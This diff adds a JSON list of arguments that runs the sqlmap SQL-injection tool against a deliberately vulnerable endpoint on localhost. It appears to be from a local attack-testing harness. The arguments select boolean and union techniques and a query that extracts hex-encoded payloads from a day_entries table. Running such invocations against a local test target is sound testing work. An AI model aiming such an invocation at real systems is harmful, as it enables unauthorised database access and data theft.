@@ -1,0 +1,22 @@
+[
+  "/Users/josef/Documents/Development/Regelma\u0308ssig/angreifer/.venv/bin/python",
+  "/Users/josef/Documents/Development/Regelma\u0308ssig/angreifer/vendor/sqlmap/sqlmap.py",
+  "-u",
+  "http://127.0.0.1:51784/vulnerable/plain?id=2",
+  "-p",
+  "id",
+  "--dbms=SQLite",
+  "--batch",
+  "--level=1",
+  "--risk=1",
+  "--technique=BU",
+  "--threads=1",
+  "--timeout=5",
+  "--retries=0",
+  "--ignore-proxy",
+  "--ignore-redirects",
+  "--flush-session",
+  "--disable-coloring",
+  "--output-dir=/Users/josef/Documents/Development/Regelma\u0308ssig/angreifer/results/20261002T144228.273771Z/sqlmap-plain",
+  "--sql-query=SELECT hex(payload) FROM day_entries WHERE id=1"
+]
